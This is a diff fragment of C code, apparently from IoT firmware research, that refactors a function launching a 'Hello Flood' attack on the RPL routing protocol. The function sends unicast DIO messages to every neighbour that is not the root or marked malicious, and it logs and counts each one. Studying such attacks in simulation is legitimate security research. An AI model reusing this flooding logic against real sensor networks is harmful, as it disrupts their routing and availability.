@@ -135,33 +135,29 @@ void add_all_nodes(){
 /* Launch the Hello Flood attack */
 void launch_flooding_attack(){
       uint8_t i;
-      int j = 0;
       /*char message[9];
       strcpy(message,"flooding");*/ 
       uip_ipaddr_t root_ip;
       rpl_dag_get_root_ipaddr(&root_ip);
-      while (j < 1){
-          for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
-                if (neighbors[i].used) {
-                    /* If is not malicious and is not the root --> flood */
-                    if (!neighbors[i].malicious && !compare_ip_address(&root_ip, &neighbors[i].ipaddr)) {
-                        //rpl_icmp6_dio_output(&neighbors[i].ipaddr);
-                        rpl_timers_schedule_unicast_dio(rpl_neighbor_get_from_ipaddr(&neighbors[i].ipaddr));
-                        //rpl_icmp6_malicious_output(&neighbors[i].ipaddr, &message, sizeof(message));
-                        char buf[21];
-                        uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
-                        printf("sending DIO %d to %s\n",i,buf);
-                        ++dis_sent_flood;
-                    }
-                    else{
-                        char buf[21];
-                        uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
-                        printf("NOT sending DIO %d to %s\n",i,buf);
-                    }
+      for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
+            if (neighbors[i].used) {
+                /* If is not malicious and is not the root --> flood */
+                if (!neighbors[i].malicious && !compare_ip_address(&root_ip, &neighbors[i].ipaddr)) {
+                    //rpl_icmp6_dis_output(&neighbors[i].ipaddr);
+                    rpl_timers_schedule_unicast_dio(rpl_neighbor_get_from_ipaddr(&neighbors[i].ipaddr));
+                    //rpl_icmp6_malicious_output(&neighbors[i].ipaddr, &message, sizeof(message));
+                    char buf[21];
+                    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
+                    printf("sending DIO %d to %s\n",i,buf);
+                    ++dis_sent_flood;
                 }
-                else break;
-          }
-          ++j; 
+                else{
+                    char buf[21];
+                    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
+                    printf("NOT sending DIO %d to %s\n",i,buf);
+                }
+            }
+            else break;
      }
      //rpl_timers_schedule_periodic_dis();
      
